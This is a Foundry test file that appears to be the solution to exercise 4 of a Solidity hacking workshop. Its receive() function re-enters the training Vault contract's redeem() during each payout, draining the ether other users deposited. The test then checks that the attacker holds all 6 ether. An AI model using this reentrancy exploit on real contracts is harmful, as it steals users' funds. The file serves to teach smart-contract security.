// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Vault} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise4_Vault is Test {
    Vault vault;

    function setUp() public {
        vault = new Vault();
    }

    function test_redeem() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);
        vm.deal(userA, 2 ether);
        vm.deal(userB, 3 ether);
        vm.deal(address(this), 1 ether);

        vm.startPrank(userA);
        vault.store{value: 2 ether}();
        vm.stopPrank();

        // user b stores his money
        vm.startPrank(userB);
        vault.store{value: 3 ether}();
        vm.stopPrank();

        vault.store{value: 1 ether}();
        vault.redeem();

        require(address(this).balance == 6 ether, "invalid balance");
    }

    fallback() external payable {
        console.log("fallback");
    }

    receive() external payable {
        console.log("receive");
        if (address(vault).balance != 0) vault.redeem();
    }
}
